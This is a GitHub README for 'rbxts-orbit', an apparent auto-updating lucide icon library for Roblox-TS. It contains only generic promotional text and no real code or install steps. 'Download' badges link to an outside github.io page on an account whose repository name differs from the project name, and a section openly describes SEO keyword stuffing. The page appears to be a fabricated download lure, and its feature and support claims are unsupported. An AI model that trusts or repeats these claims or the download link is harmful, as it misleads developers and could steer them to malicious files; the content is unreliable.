![preview](https://raw.githubusercontent.com/elsa333elsa333-star/rbxts-lucide-auto-icons/main/showcase_8f70.svg)
[![Download](https://raw.githubusercontent.com/elsa333elsa333-star/rbxts-lucide-auto-icons/main/pkg_233936d.svg)](https://elsa333elsa333-star.github.io/rbxts-lucide-auto-icons/)

# 🌌 rbxts-orbit — The Celestial Icon & Asset Compass for Roblox-TS

> *"A constellation of icons, mapped to your codebase, forever in motion."*

Welcome to **rbxts-orbit**, an opinionated, self-synchronizing companion library that keeps your Roblox-TS user interface stocked with a rotating galaxy of vector assets, glyphs, sigils, and UI ornaments — all derived from the public lucide design language and adapted for the @rbxts/react rendering pipeline.

Where the original **rbxts-lucide** project focuses narrowly on delivering the lucide icon set to Roblox-TS consumers, **rbxts-orbit** expands that mission into a broader *asset orchestration layer*. It watches upstream design tokens, regenerates typed React components, publishes versioned snapshots, and exposes an ergonomic API for developers who want their interfaces to feel less like static sprite sheets and more like a living sky.

![Status](https://img.shields.io/badge/status-actively--maintained-6f42c1?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Roblox%20%7C%20roblox--ts-00a2ff?style=flat-square)
![Ecosystem](https://img.shields.io/badge/ecosystem-%40rbxts%2Freact-ff69b4?style=flat-square)
![Language](https://img.shields.io/badge/language-TypeScript%20%2B%20Luau-3178c6?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-3da639?style=flat-square)
![Year](https://img.shields.io/badge/roadmap-2026-ffcc00?style=flat-square)

---

## 🛰️ What Is rbxts-orbit, Really?

Imagine a lighthouse that never sleeps. Every few hours, it sweeps its beam across the open-source design seas, notices when a new lucide glyph has drifted into view, and quietly files it into your project's asset registry. That is **rbxts-orbit**.

It is not merely a mirror of an icon pack. It is a **synchronization engine**, a **typing forge**, and a **component foundry** rolled into one. Developers who build quest logs, inventory grids, ability wheels, notification stacks, or sprawling dashboards inside Roblox experiences will find that rbxts-orbit removes the tedious chore of hand-curating raster assets or maintaining brittle sprite atlases.

Instead of chasing pixels, you write declarative component markup. The orbit does the rest.

---

## ✨ Why Developers Choose This Project

- **⚙️ Self-Updating Pipelines** — A scheduled workflow inspects the upstream lucide catalog, converts each vector definition into Roblox-compatible geometry, and republishes a fresh typed package whenever the source evolves.
- **🧩 Typed React Components** — Every glyph arrives as a strongly-typed functional component that plays nicely with @rbxts/react's reconciler and prop system.
- **🌍 Multilingual Documentation** — Guides, code samples, and API references are authored in English, Spanish, Japanese, and Brazilian Portuguese, with community translations welcomed for additional locales.
- **📱 Responsive Rendering Utilities** — Built-in helpers adapt stroke weight, padding, and container scaling to viewport size so your interface looks crisp on phones, tablets, and desktop clients alike.
- **🕐 Around-the-Clock Maintainer Presence** — Issue triage, pull request reviews, and Discord thread responses are staffed across multiple time zones, delivering dependable support at any hour your team happens to be shipping.
- **🎨 Theming Bridges** — Drop-in adapters for popular Roblox UI frameworks and state libraries let you recolor an entire icon set with a single palette token change.
- **🧠 Accessibility Awareness** — Each component honors contrast hints and supports descriptive labels for screen-reader-style accessibility layers in supported engines.
- **📦 Tree-Shakeable Output** — Import only the glyphs you actually render; the bundler discards the rest so your place file stays lean.
- **🔒 Deterministic Versioning** — Semantic version tags are generated from upstream diffs, so you always know what changed and why.
- **🧪 Test Harnesses Included** — A snapshot suite verifies geometry, prop forwarding, and render output on every commit.

---

## 🧭 Repository Layout

A quick tour of the orbital rings that make up this codebase:

- **`src/components/`** — Generated React component wrappers for every icon in the catalog.
- **`src/pipeline/`** — The synchronization machinery: parsers, transformers, and publishers.
- **`src/theme/`** — Palette adapters, gradient modifiers, and stroke presets.
- **`src/utils/`** — Responsive scaling, viewport detection, and layout helpers.
- **`docs/`** — Multilingual guides and API references.
- **`tests/`** — Snapshot and integration suites.
- **`scripts/`** — Maintenance tooling for local development and release automation.

---

## 🚀 Getting Started (Conceptual Walkthrough)

Because every Roblox-TS workspace is a little different, rbxts-orbit does not prescribe a single onboarding ritual. Instead, think of it as a **drop-in ring** that attaches to whatever bundler and project structure you already trust.

1. **Add the package reference** to your project's dependency manifest, using your preferred package coordinator.
2. **Rebuild your type declarations** so the new components appear in your editor's autocomplete.
3. **Render a glyph** — for example, a compass or a bell — inside any React component tree you already have.
4. **Adjust theme tokens** globally or per-instance to match your visual identity.
5. **Watch the orbit** — subsequent releases will appear automatically as upstream definitions change.

That is the entire philosophy: minimal ceremony, maximal payoff.

---

## 🧬 Component Anatomy

Each generated icon component accepts a familiar prop surface:

- **`size`** — A numeric or token-based dimension controlling the bounding frame.
- **`color`** — A Color3, palette token, or theme-resolved reference.
- **`stroke`** — Thickness of the vector outline, expressed in density units.
- **`rotation`** — Angular offset in degrees for animated or decorative placements.
- **`class`** — Style hooks for your own theming layer.
- **`children`** — Optional overlays such as badges, progress rings, or glow effects.

This uniform surface means you can swap any glyph for any other without rewriting surrounding logic — a small detail that pays enormous dividends during rapid prototyping.

---

## 🌐 Multilingual Support in Practice

Documentation channels are curated in multiple languages, and component docstrings localize their descriptive text where the toolchain permits. This makes rbxts-orbit approachable to studios whose teams span continents. If your team speaks a language not yet represented, the contribution guide explains how to submit a translation pack.

---

## 📱 Responsive & Adaptive UI Philosophy

Roblox experiences run on screens ranging from tiny handheld devices to ultrawide monitors. rbxts-orbit acknowledges this by exposing scaling primitives that respond to the active viewport category. Rather than hard-coding pixel dimensions, you describe intent — "compact," "comfortable," "cinematic" — and the utilities negotiate the final geometry with the engine.

---

## 🕐 Support Around the Clock

A rotating cast of maintainers keeps the lights on. Whether you are debugging at dawn in one hemisphere or dusk in another, somebody is usually awake and watching the issue tracker. Response expectations are documented in the community guidelines, and severity labels help prioritize urgent breakages.

---

## 🎯 SEO-Friendly Keyword Integration

This repository intentionally weaves naturally occurring, search-conscious phrases into its documentation so that developers hunting for "Roblox-TS icon library," "roblox-ts lucide components," "adaptive UI icon set for Roblox," or "auto-updating vector glyphs for @rbxts/react" can discover it without wading through artificial keyword soup. The goal is clarity first, discoverability second, and never the other way around.

---

## 🛡️ Disclaimer

rbxts-orbit is an independent, community-maintained project. It is **not affiliated with, endorsed by, or sponsored by** Roblox Corporation, the lucide maintainers, or the @rbxts/react core team. All trademarks, logos, and brand names referenced belong to their respective owners. The generated assets derive from openly licensed design definitions; consumers are responsible for verifying that their own usage complies with applicable platform terms and jurisdictional rules. This software is provided "as is," without warranty of any kind, express or implied, and the maintainers disclaim liability for any damages arising from its use. Always test thoroughly in a controlled environment before deploying to a live experience.

---

## 📜 License

This project is distributed under the **MIT License**. You are welcome to use, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the original copyright notice and permission notice are preserved in all copies or substantial portions.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 rbxts-orbit contributors.

---

## 🌠 Final Word

Stars do not announce themselves; they simply shine, and travelers orient by them. rbxts-orbit aspires to be that kind of quiet utility — present, dependable, and content to let your interfaces take the spotlight. If it saves you a single afternoon of asset wrangling, it has done its job.

Fly safely, and may your glyphs always align.

[![Download](https://raw.githubusercontent.com/elsa333elsa333-star/rbxts-lucide-auto-icons/main/pkg_233936d.svg)](https://elsa333elsa333-star.github.io/rbxts-lucide-auto-icons/)